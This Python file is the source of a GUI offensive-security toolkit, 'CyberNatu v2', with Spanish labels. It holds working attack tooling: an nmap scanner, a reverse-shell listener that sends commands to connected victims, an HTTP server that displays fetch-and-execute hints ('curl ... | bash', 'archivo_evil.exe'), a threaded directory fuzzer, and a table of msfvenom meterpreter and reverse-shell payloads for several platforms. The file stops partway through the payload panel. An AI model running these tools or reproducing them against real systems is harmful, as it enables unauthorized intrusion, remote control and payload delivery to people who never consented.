import os
import platform
import socket
import threading
import http.server
import socketserver
import functools
import subprocess
import tkinter as tk
import concurrent.futures
import base64
import binascii
import hashlib
import shutil
import webbrowser
import json
import re
import urllib.parse
import urllib.parse

import customtkinter as ctk
import requests

# Paletas estilo startup (toggle dark/light)
PALETTES = {
    "dark": {
        "BG_MAIN": "#08090d",
        "BG_PANEL": "#0e1016",
        "BG_CARD": "#12141d",
        "ACCENT": "#1f2937",          # negro azulado (sustituye azul)
        "ACCENT_HOVER": "#111827",    # negro más profundo
        "ACCENT_SECONDARY": "#2d2f3a", # gris oscuro (sustituye rosa)
        "TEXT_PRIMARY": "#e5e7eb",
        "TEXT_MUTED": "#9ca3af",
        "TEXT_SUCCESS": "#34d399",
        "TEXT_WARNING": "#fbbf24",
        "TEXT_DANGER": "#f87171",
        "BORDER": "#1c1f2a",
    },
    "light": {
        "BG_MAIN": "#f5f6f8",
        "BG_PANEL": "#eceef2",
        "BG_CARD": "#e4e6eb",
        "ACCENT": "#4b5563",          # gris (sustituye celeste)
        "ACCENT_HOVER": "#374151",    # gris más oscuro
        "ACCENT_SECONDARY": "#5b6070", # gris oscuro (sustituye rosa)
        "TEXT_PRIMARY": "#0f172a",
        "TEXT_MUTED": "#6b7280",
        "TEXT_SUCCESS": "#0ea371",
        "TEXT_WARNING": "#c26b0a",
        "TEXT_DANGER": "#b91c1c",
        "BORDER": "#d1d5db",
    },
}

MONO_FONT = ("Fira Code", 11)
UI_FONT = ("Segoe UI Rounded", 12)
UI_FONT_BOLD = ("Segoe UI Rounded", 12, "bold")

# Opcional: nmap
try:
    import nmap
except ImportError:
    nmap = None

CFG_PATH = os.path.join(os.path.expanduser("~"), ".cybernatu_theme.json")


class Toast:
    def __init__(self, root, text, c):
        self.top = ctk.CTkToplevel(root)
        self.top.overrideredirect(True)
        self.top.attributes("-topmost", True)
        self.top.configure(fg_color=c["BG_CARD"])
        lbl = ctk.CTkLabel(self.top, text=text, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        lbl.pack(padx=12, pady=8)
        x = root.winfo_rootx() + root.winfo_width() - 260
        y = root.winfo_rooty() + root.winfo_height() - 120
        self.top.geometry(f"240x60+{x}+{y}")
        self.top.after(2000, self.top.destroy)


class CyberNatuApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("blue")

        self.theme = self.load_theme()
        self.c = PALETTES[self.theme]

        self.title("CyberNatu v2 - Startup Edition")
        self.geometry("1220x760")
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.build_ui()

    def load_theme(self):
        if os.path.exists(CFG_PATH):
            try:
                with open(CFG_PATH, "r") as f:
                    data = json.load(f)
                    if data.get("theme") in PALETTES:
                        return data["theme"]
            except Exception:
                pass
        return "dark"

    def save_theme(self):
        try:
            with open(CFG_PATH, "w") as f:
                json.dump({"theme": self.theme}, f)
        except Exception:
            pass

    # ---------- UI Skeleton ---------- #
    def build_ui(self):
        self.configure(fg_color=self.c["BG_MAIN"])

        # Sidebar
        self.sidebar = ctk.CTkFrame(self, fg_color=self.c["BG_PANEL"], width=210, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(8, weight=1)

        ctk.CTkLabel(self.sidebar, text="⚡ CyberNatu", font=("Poppins", 18, "bold"), text_color=self.c["TEXT_PRIMARY"]).pack(pady=(18, 4))
        ctk.CTkLabel(self.sidebar, text="Startup Security", font=UI_FONT, text_color=self.c["TEXT_MUTED"]).pack(pady=(0, 14))

        self.theme_switch = ctk.CTkSegmentedButton(
            self.sidebar,
            values=["Dark", "Light"],
            command=self.toggle_theme,
            fg_color=self.c["BG_CARD"],
            selected_color=self.c["ACCENT"],
            text_color=self.c["TEXT_PRIMARY"]
        )
        self.theme_switch.set("Dark" if self.theme == "dark" else "Light")
        self.theme_switch.pack(pady=(0, 16), padx=12, fill="x")

        self.nav_buttons = {}
        nav_items = [
            ("🔍 Escáner", "scanner"),
            ("🎧 Listener", "listener"),
            ("💣 Payloads", "payloads"),
            ("🌐 Fuzzer", "fuzzer"),
            ("🛠 Utils", "utils"),
            ("🧬 Crypto", "crypto"),
            ("📜 Logs", "logs"),
            ("📂 Viewer", "viewer"),
        ]
        for text, key in nav_items:
            btn = ctk.CTkButton(self.sidebar, text=text, width=180, height=44,
                                fg_color="transparent", hover_color=self.c["ACCENT_HOVER"],
                                text_color=self.c["TEXT_MUTED"], corner_radius=10,
                                font=UI_FONT_BOLD,
                                command=lambda k=key: self.show_panel(k))
            btn.pack(pady=5, padx=12)
            self.nav_buttons[key] = btn

        ctk.CTkLabel(self.sidebar, text="v2.0", text_color=self.c["TEXT_MUTED"], font=UI_FONT).pack(pady=12)

        # Content
        self.content = ctk.CTkFrame(self, fg_color=self.c["BG_MAIN"])
        self.content.grid(row=0, column=1, sticky="nsew", padx=16, pady=16)
        self.content.grid_rowconfigure(0, weight=1)
        self.content.grid_columnconfigure(0, weight=1)

        # Panels
        self.panels = {
            "scanner": ScannerPanel(self),
            "listener": ListenerPanel(self),
            "payloads": PayloadsPanel(self),
            "fuzzer": FuzzerPanel(self),
            "utils": UtilsPanel(self),
            "crypto": CryptoPanel(self),
            "logs": LogsPanel(self),
            "viewer": ViewerPanel(self),
        }
        for p in self.panels.values():
            p.grid(row=0, column=0, sticky="nsew")
        self.show_panel("scanner")

    def toggle_theme(self, value):
        self.theme = "dark" if value.lower() == "dark" else "light"
        self.c = PALETTES[self.theme]
        ctk.set_appearance_mode("Dark" if self.theme == "dark" else "Light")
        self.save_theme()
        for w in (self.sidebar, self.content):
            w.destroy()
        self.build_ui()
        Toast(self, f"Tema: {self.theme}", self.c)

    def show_panel(self, key):
        for k, panel in self.panels.items():
            panel.grid_remove()
            self.nav_buttons[k].configure(fg_color="transparent", text_color=self.c["TEXT_MUTED"])
        self.panels[key].grid()
        self.nav_buttons[key].configure(fg_color=self.c["ACCENT"], text_color=self.c["TEXT_PRIMARY"])

    def obtener_ip_local(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
        except Exception:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip


# ---------- Panel Escáner ---------- #
class ScannerPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        self.app = app
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.build()

    def build(self):
        c = self.app.c
        hero = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        hero.pack(fill="x", pady=8)
        ctk.CTkLabel(hero, text="Escaneo de Red", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)
        self.status_indicator = ctk.CTkLabel(hero, text="OFFLINE", text_color=c["TEXT_DANGER"], font=UI_FONT_BOLD)
        self.status_indicator.pack(side="right", padx=16)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", pady=10)
        ctk.CTkLabel(form, text="Objetivo / IP", text_color=c["TEXT_PRIMARY"], font=UI_FONT_BOLD).grid(row=0, column=0, padx=14, pady=12, sticky="w")
        self.entry_ip = ctk.CTkEntry(form, width=260, placeholder_text="192.168.1.10",
                                     fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                     corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.entry_ip.grid(row=0, column=1, padx=10, pady=12, sticky="w")

        self.btn_scan = ctk.CTkButton(form, text="Iniciar Escaneo", width=170, height=42,
                                      fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                                      corner_radius=12, font=UI_FONT_BOLD,
                                      command=self.iniciar_escaneo_visual)
        self.btn_scan.grid(row=0, column=2, padx=14, pady=12)

        self.progress_bar = ctk.CTkProgressBar(form, width=360, progress_color=c["ACCENT"], fg_color=c["BG_CARD"], corner_radius=10)
        self.progress_bar.grid(row=1, column=0, columnspan=3, padx=14, pady=(0, 12))
        self.progress_bar.set(0)

        self.results_frame = ctk.CTkScrollableFrame(self, fg_color=c["BG_PANEL"], height=480)
        self.results_frame.pack(fill="both", expand=True, pady=10, padx=4)
        self.empty_label = ctk.CTkLabel(self.results_frame, text="Inicia un escaneo para ver puertos y servicios.",
                                        text_color=c["TEXT_MUTED"], font=UI_FONT)
        self.empty_label.pack(pady=20)

    def iniciar_escaneo_visual(self):
        for w in self.results_frame.winfo_children():
            w.destroy()
        raw_target = self.entry_ip.get().strip()
        target = self.normalize_target(raw_target)
        if not target:
            Toast(self.app, "Objetivo inválido", self.app.c)
            return
        self.btn_scan.configure(state="disabled", text="ESCANEANDO...")
        self.status_indicator.configure(text="SCANNING", text_color=self.app.c["TEXT_WARNING"])
        self.progress_bar.configure(mode="indeterminate")
        self.progress_bar.start()
        threading.Thread(target=self.proceso_escaneo_backend, args=(target,), daemon=True).start()

    def normalize_target(self, text):
        if not text:
            return None
        if text.startswith("http://") or text.startswith("https://"):
            try:
                parsed = urllib.parse.urlparse(text)
                host = parsed.hostname
                return host
            except Exception:
                return None
        # If URL without scheme but contains '/'
        if "/" in text:
            try:
                parsed = urllib.parse.urlparse("http://" + text)
                return parsed.hostname
            except Exception:
                return None
        return text

    def proceso_escaneo_backend(self, target):
        if nmap is None:
            self.after(0, lambda: self.app.panels["logs"].append("[!] python-nmap no está instalado.\n"))
            self.after(0, self.reset_gui_error)
            return
        rutas = [r"C:\Program Files (x86)\Nmap\nmap.exe", r"C:\Program Files\Nmap\nmap.exe"]
        try:
            nm = nmap.PortScanner(nmap_search_path=rutas)
        except nmap.PortScannerError:
            self.after(0, lambda: self.app.panels["logs"].append("[!] No se encontró nmap.exe\n"))
            self.after(0, self.reset_gui_error)
            return
        try:
            nm.scan(hosts=target, arguments='-Pn -sV -T4 --open')
            datos = []
            if target in nm.all_hosts():
                for proto in nm[target].all_protocols():
                    for port in nm[target][proto].keys():
                        service = nm[target][proto][port]['name']
                        version = nm[target][proto][port]['product'] + " " + nm[target][proto][port]['version']
                        datos.append({"port": str(port), "service": service, "version": version})
            self.after(0, lambda: self.mostrar_resultados(datos))
            self.after(0, lambda: self.app.panels["logs"].append(f"Scan {target}: {len(datos)} puertos abiertos.\n"))
        except Exception as e:
            self.after(0, lambda: self.app.panels["logs"].append(f"[!] Error escaneo {target}: {e}\n"))
            self.after(0, self.reset_gui_error)

    def reset_gui_error(self):
        self.progress_bar.stop()
        self.progress_bar.configure(mode="determinate")
        self.progress_bar.set(0)
        self.btn_scan.configure(state="normal", text="ERROR - REVISAR")
        self.status_indicator.configure(text="ERROR", text_color=self.app.c["TEXT_DANGER"])

    def mostrar_resultados(self, datos):
        self.progress_bar.stop()
        self.progress_bar.configure(mode="determinate")
        self.progress_bar.set(1)
        self.btn_scan.configure(state="normal", text="INICIAR ESCANEO")
        self.status_indicator.configure(text="ONLINE", text_color=self.app.c["TEXT_SUCCESS"])

        c = self.app.c
        if not datos:
            ctk.CTkLabel(self.results_frame, text="No se encontraron puertos abiertos.", text_color=c["TEXT_MUTED"]).pack(pady=12)
            Toast(self.app, "0 puertos abiertos", c)
            return

        header = ctk.CTkFrame(self.results_frame, fg_color=c["BG_CARD"], corner_radius=10)
        header.pack(fill="x", pady=4, padx=8)
        ctk.CTkLabel(header, text="PUERTO", width=90, font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=10, pady=8)
        ctk.CTkLabel(header, text="SERVICIO", width=150, font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=10, pady=8)
        ctk.CTkLabel(header, text="VERSIÓN", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=10, pady=8)

        for item in datos:
            fila = ctk.CTkFrame(self.results_frame, fg_color=c["BG_PANEL"])
            fila.pack(fill="x", pady=2, padx=6)
            color_p = c["TEXT_DANGER"] if item['port'] in ["22", "3389", "445"] else c["ACCENT_SECONDARY"]
            btn_port = ctk.CTkButton(fila, text=item['port'], width=90, fg_color=color_p,
                                     hover=False, corner_radius=10, font=UI_FONT_BOLD, text_color="#0b0b0b")
            btn_port.pack(side="left", padx=8, pady=4)
            btn_port.bind("<Button-3>", lambda e, p=item['port'], s=item['service']: self.ctx_menu(e, p, s))
            ctk.CTkLabel(fila, text=item['service'], width=150, anchor="w", text_color=c["TEXT_PRIMARY"], font=UI_FONT).pack(side="left", padx=8)
            ctk.CTkLabel(fila, text=item['version'], anchor="w", text_color=c["TEXT_MUTED"], font=UI_FONT).pack(side="left", padx=8)

    def ctx_menu(self, event, puerto, servicio):
        menu = tk.Menu(self, tearoff=0, bg="#1f1f2b", fg="white")
        menu.add_command(label=f"Puerto {puerto}", state="disabled")
        menu.add_separator()
        menu.add_command(label="Copiar puerto", command=lambda: self.clipboard_clear() or self.clipboard_append(puerto))
        if "http" in servicio or "80" in str(puerto):
            menu.add_command(label="Abrir en navegador", command=lambda: webbrowser.open(f"http://{self.entry_ip.get()}:{puerto}"))
        menu.tk_popup(event.x_root, event.y_root)


# ---------- Panel Listener (modal) ---------- #
class ListenerPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.server_socket = None
        self.client_socket = None
        self.is_listening = False
        self.modal = None
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Listener Python", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", pady=10)
        self.listen_port = ctk.CTkEntry(form, width=140, placeholder_text="4444",
                                        fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                        corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.listen_port.insert(0, "4444")
        self.listen_port.pack(side="left", padx=14, pady=12)

        self.btn_listen = ctk.CTkButton(form, text="Poner a la Escucha", fg_color=c["ACCENT"],
                                        hover_color=c["ACCENT_HOVER"], corner_radius=12, font=UI_FONT_BOLD,
                                        command=self.start_python_listener)
        self.btn_listen.pack(side="left", padx=10, pady=12)

        self.btn_stop = ctk.CTkButton(form, text="Detener", fg_color=c["TEXT_DANGER"],
                                      hover_color="#dc2626", corner_radius=12, font=UI_FONT_BOLD,
                                      command=self.stop_listener, state="disabled", text_color="#0b0b0b")
        self.btn_stop.pack(side="left", padx=10, pady=12)

        info = ctk.CTkLabel(self, text="La terminal aparecerá en una ventana modal al recibir la shell.", text_color=c["TEXT_MUTED"], font=UI_FONT)
        info.pack(pady=10)

    def start_python_listener(self):
        try:
            port = int(self.listen_port.get())
        except ValueError:
            return
        self.btn_listen.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.is_listening = True
        threading.Thread(target=self.listen_thread, args=(port,), daemon=True).start()

    def listen_thread(self, port):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(('0.0.0.0', port))
            self.server_socket.listen(1)
            conn, addr = self.server_socket.accept()
            self.client_socket = conn
            self.after(0, lambda: self.show_modal(addr))
            while self.is_listening:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    msg = data.decode('utf-8', errors='ignore')
                    self.after(0, lambda m=msg: self.append_modal(m))
                except Exception:
                    break
        except Exception as e:
            if self.is_listening:
                self.after(0, lambda: self.append_modal(f"[!] Error socket: {e}\n"))
        finally:
            self.stop_listener()

    def show_modal(self, addr):
        c = self.app.c
        self.modal = ctk.CTkToplevel(self)
        self.modal.title(f"Shell desde {addr[0]}")
        self.modal.geometry("780x420")
        self.modal.configure(fg_color=c["BG_MAIN"])
        self.modal.grab_set()

        self.shell_output = ctk.CTkTextbox(self.modal, height=320, font=MONO_FONT,
                                           fg_color=c["BG_CARD"], text_color=c["TEXT_SUCCESS"])
        self.shell_output.pack(fill="both", expand=True, padx=12, pady=12)
        self.shell_output.insert("end", f"[+] Conexión de {addr[0]}\n")

        self.shell_input = ctk.CTkEntry(self.modal, placeholder_text="Comando (whoami)...",
                                        fg_color=c["BG_CARD"], border_color=c["ACCENT"], border_width=1,
                                        corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.shell_input.pack(fill="x", padx=12, pady=(0, 12))
        self.shell_input.bind("<Return>", self.send_command)
        self.shell_input.focus()

    def append_modal(self, msg):
        if self.modal:
            self.shell_output.insert("end", msg)
            self.shell_output.see("end")

    def send_command(self, event=None):
        if not self.client_socket:
            return
        cmd = self.shell_input.get()
        if not cmd:
            return
        self.shell_input.delete(0, "end")
        self.append_modal(f"> {cmd}\n")
        try:
            self.client_socket.send((cmd + "\n").encode('utf-8'))
        except Exception as e:
            self.append_modal(f"[!] Error enviando: {e}\n")

    def stop_listener(self):
        self.is_listening = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass
            self.client_socket = None
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
            self.server_socket = None
        self.after(0, self.reset_ui)

    def reset_ui(self):
        self.btn_listen.configure(state="normal")
        self.btn_stop.configure(state="disabled")
        if self.modal:
            self.modal.destroy()
            self.modal = None


# ---------- Panel Utilidades ---------- #
class UtilsPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.httpd = None
        self.http_thread = None
        self.selected_folder = os.getcwd()
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Utilidades", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        hosts_card = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        hosts_card.pack(fill="x", pady=8)
        ctk.CTkLabel(hosts_card, text="Añadir dominio a hosts", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="w")
        self.domain_entry = ctk.CTkEntry(hosts_card, placeholder_text="victima.htb",
                                         fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                         corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.domain_entry.grid(row=1, column=0, padx=12, pady=(0, 10), sticky="w")
        self.btn_hosts = ctk.CTkButton(hosts_card, text="Añadir", fg_color=c["ACCENT_SECONDARY"], hover_color=c["ACCENT_HOVER"],
                                       corner_radius=12, font=UI_FONT_BOLD, command=self.add_to_hosts)
        self.btn_hosts.grid(row=1, column=1, padx=10, pady=(0, 10))

        server_card = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        server_card.pack(fill="x", pady=8)
        ctk.CTkLabel(server_card, text="Servidor HTTP rápido", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="w")

        self.http_port_entry = ctk.CTkEntry(server_card, width=140, placeholder_text="8000",
                                            fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                            corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.http_port_entry.insert(0, "8000")
        self.http_port_entry.grid(row=1, column=0, padx=12, pady=8, sticky="w")

        self.btn_folder = ctk.CTkButton(server_card, text="📂 Carpeta", width=110,
                                        fg_color=c["BG_CARD"], hover_color=c["ACCENT_HOVER"],
                                        corner_radius=10, font=UI_FONT_BOLD, command=self.choose_directory)
        self.btn_folder.grid(row=1, column=1, padx=8, pady=8)

        self.btn_http_start = ctk.CTkButton(server_card, text="Start Server", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                                            corner_radius=12, font=UI_FONT_BOLD, command=self.start_http_server)
        self.btn_http_start.grid(row=1, column=2, padx=8, pady=8)

        self.btn_http_stop = ctk.CTkButton(server_card, text="Stop", fg_color=c["TEXT_DANGER"], hover_color="#dc2626",
                                           corner_radius=12, font=UI_FONT_BOLD, command=self.stop_http_server,
                                           state="disabled", text_color="#0b0b0b")
        self.btn_http_stop.grid(row=1, column=3, padx=8, pady=8)

        self.http_status = ctk.CTkLabel(server_card, text="Server detenido.", text_color=c["TEXT_MUTED"], font=UI_FONT)
        self.http_status.grid(row=2, column=0, columnspan=4, padx=12, pady=6, sticky="w")

        self.download_hint = ctk.CTkTextbox(server_card, width=640, height=70,
                                            fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"], font=MONO_FONT)
        self.download_hint.insert("end", "Cuando arranques el servidor verás aquí el comando wget/curl.\n")
        self.download_hint.configure(state="disabled")
        self.download_hint.grid(row=3, column=0, columnspan=4, padx=12, pady=8, sticky="we")

        ctk.CTkLabel(server_card, text="Logs del servidor", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=4, column=0, padx=12, pady=(6, 2), sticky="w")
        self.http_log_box = ctk.CTkTextbox(server_card, width=640, height=110, font=MONO_FONT,
                                           fg_color=c["BG_CARD"], text_color=c["TEXT_SUCCESS"])
        self.http_log_box.grid(row=5, column=0, columnspan=4, padx=12, pady=(2, 12), sticky="we")

    def add_to_hosts(self):
        ip = self.app.panels["scanner"].entry_ip.get()
        domain = self.domain_entry.get()
        if not ip or not domain:
            return
        ruta = r"C:\Windows\System32\drivers\etc\hosts" if platform.system() == "Windows" else "/etc/hosts"
        try:
            with open(ruta, "a") as f:
                f.write(f"\n{ip} {domain}")
            self.http_status.configure(text=f"Añadido {domain} -> {ip}", text_color=self.app.c["TEXT_SUCCESS"])
        except PermissionError:
            self.http_status.configure(text=f"Permisos insuficientes para {ruta}", text_color=self.app.c["TEXT_DANGER"])

    def choose_directory(self):
        from tkinter import filedialog
        folder = filedialog.askdirectory()
        if folder:
            self.selected_folder = folder
            self.http_status.configure(text=f"Sirviendo: {os.path.basename(folder)}", text_color=self.app.c["TEXT_PRIMARY"])

    def start_http_server(self):
        if self.httpd is not None:
            return
        port_text = self.http_port_entry.get() or "8000"
        try:
            port = int(port_text)
        except ValueError:
            self.http_status.configure(text="Puerto inválido.", text_color=self.app.c["TEXT_WARNING"])
            return

        class GUIRequestHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(handler_self, format, *args):
                mensaje = "%s - - [%s] %s\n" % (
                    handler_self.client_address[0],
                    handler_self.log_date_time_string(),
                    format % args
                )
                self.after(0, lambda: self.write_http_log(mensaje))

        handler = functools.partial(GUIRequestHandler, directory=self.selected_folder)
        try:
            self.httpd = socketserver.TCPServer(("", port), handler)
        except OSError as e:
            self.http_status.configure(text=f"Error puerto: {e.strerror}", text_color=self.app.c["TEXT_DANGER"])
            self.httpd = None
            return

        def serve():
            try:
                self.httpd.serve_forever()
            except Exception:
                pass

        self.http_thread = threading.Thread(target=serve, daemon=True)
        self.http_thread.start()
        self.btn_http_start.configure(state="disabled")
        self.btn_http_stop.configure(state="normal")
        self.btn_folder.configure(state="disabled")
        self.http_status.configure(text=f"ON | Port {port} | Dir: .../{os.path.basename(self.selected_folder)}", text_color=self.app.c["TEXT_SUCCESS"])

        local_ip = self.app.obtener_ip_local()
        self.download_hint.configure(state="normal")
        self.download_hint.delete("1.0", "end")
        self.download_hint.insert("end", f"wget http://{local_ip}:{port}/archivo_evil.exe\ncurl http://{local_ip}:{port}/script.sh | bash")
        self.download_hint.configure(state="disabled")

    def write_http_log(self, msg):
        self.http_log_box.insert("end", msg)
        self.http_log_box.see("end")

    def stop_http_server(self):
        if self.httpd is None:
            return
        self.httpd.shutdown()
        self.httpd.server_close()
        self.httpd = None
        self.http_thread = None
        self.btn_http_start.configure(state="normal")
        self.btn_http_stop.configure(state="disabled")
        self.btn_folder.configure(state="normal")
        self.http_status.configure(text="Server detenido.", text_color=self.app.c["TEXT_MUTED"])


# ---------- Panel Fuzzer ---------- #
class FuzzerPanel(ctk.CTkFrame):
    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.wordlist_path = None
        self.fuzzing_active = False
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Web Fuzzer", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", pady=10, padx=4)
        ctk.CTkLabel(form, text="URL Base", font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="e")
        self.fuzz_url_entry = ctk.CTkEntry(form, width=320, placeholder_text="http://192.168.1.X",
                                           fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                           corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.fuzz_url_entry.grid(row=0, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkButton(form, text="📂 Diccionario", width=120,
                      command=self.load_wordlist, fg_color=c["BG_CARD"], hover_color=c["ACCENT_HOVER"],
                      corner_radius=10, font=UI_FONT_BOLD, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=2, padx=10, pady=10)
        self.lbl_wordlist = ctk.CTkLabel(form, text="Ninguno seleccionado", text_color=c["TEXT_MUTED"], font=UI_FONT)
        self.lbl_wordlist.grid(row=1, column=1, sticky="w", padx=12, pady=(0, 10))

        self.btn_fuzz = ctk.CTkButton(self, text="Iniciar Fuzzing (50 hilos)", fg_color=c["ACCENT"],
                                      hover_color=c["ACCENT_HOVER"], corner_radius=12, font=UI_FONT_BOLD,
                                      command=self.start_fuzzing)
        self.btn_fuzz.pack(fill="x", padx=10, pady=12)

        self.fuzz_results = ctk.CTkTextbox(self, height=420, font=MONO_FONT,
                                           fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"])
        self.fuzz_results.pack(fill="both", expand=True, padx=10, pady=10)

    def load_wordlist(self):
        from tkinter import filedialog
        filename = filedialog.askopenfilename(title="Selecciona Wordlist (txt)")
        if filename:
            self.wordlist_path = filename
            self.lbl_wordlist.configure(text=f"...{os.path.basename(filename)}")

    def start_fuzzing(self):
        if self.fuzzing_active:
            self.fuzzing_active = False
            self.btn_fuzz.configure(text="Iniciar Fuzzing (50 hilos)", fg_color=self.app.c["ACCENT"], hover_color=self.app.c["ACCENT_HOVER"])
            self.log_fuzz("[-] Deteniendo...")
            return
        url = self.fuzz_url_entry.get()
        if not url or not self.wordlist_path:
            self.log_fuzz("[!] Falta URL o diccionario.")
            return
        if not url.startswith("http"):
            url = "http://" + url
        self.fuzzing_active = True
        self.btn_fuzz.configure(text="DETENER", fg_color=self.app.c["TEXT_DANGER"], hover_color="#dc2626")
        self.fuzz_results.delete("1.0", "end")
        self.log_fuzz(f"[*] Iniciando ataque a {url}")
        threading.Thread(target=self.run_fuzz_threads, args=(url,), daemon=True).start()

    def run_fuzz_threads(self, base_url):
        try:
            with open(self.wordlist_path, 'r', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log_fuzz(f"[!] Error leyendo archivo: {e}")
            self.reset_fuzz_ui()
            return
        total = len(words)
        self.log_fuzz(f"[*] Diccionario cargado: {total} palabras.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for word in words:
                if not self.fuzzing_active:
                    break
                futures.append(executor.submit(self.check_url, base_url, word))
            concurrent.futures.wait(futures)
        self.log_fuzz("[*] Escaneo finalizado.")
        self.after(0, self.reset_fuzz_ui)

    def check_url(self, base_url, word):
        if not self.fuzzing_active:
            return
        target = f"{base_url}/{word}"
        try:
            r = requests.get(target, timeout=3)
            code = r.status_code
            if code != 404:
                msg = f"[{code}] /{word}"
                self.after(0, lambda: self.log_fuzz(msg))
        except Exception:
            pass

    def log_fuzz(self, msg, color=None):
        self.fuzz_results.insert("end", msg + "\n")
        self.fuzz_results.see("end")

    def reset_fuzz_ui(self):
        self.fuzzing_active = False
        self.btn_fuzz.configure(text="Iniciar Fuzzing (50 hilos)", fg_color=self.app.c["ACCENT"], hover_color=self.app.c["ACCENT_HOVER"])


# ---------- Panel Payloads ---------- #
class PayloadsPanel(ctk.CTkFrame):
    PAYLOADS_DB = {
        "Windows (.exe)":   {"p": "windows/meterpreter/reverse_tcp", "f": "exe", "ext": "exe"},
        "Linux (.elf)":     {"p": "linux/x64/shell_reverse_tcp",     "f": "elf", "ext": "elf"},
        "Android (.apk)":   {"p": "android/meterpreter/reverse_tcp", "f": "raw", "ext": "apk"},
        "Python (.py)":     {"p": "python/meterpreter/reverse_tcp",  "f": "raw", "ext": "py"},
        "Web PHP (.php)":   {"p": "php/meterpreter_reverse_tcp",     "f": "raw", "ext": "php"},
        "Bash (.sh)":       {"p": "cmd/unix/reverse_bash",           "f": "raw", "ext": "sh"}
    }

    def __init__(self, app: CyberNatuApp):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Generador de Payloads (msfvenom)", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", padx=14, pady=10)

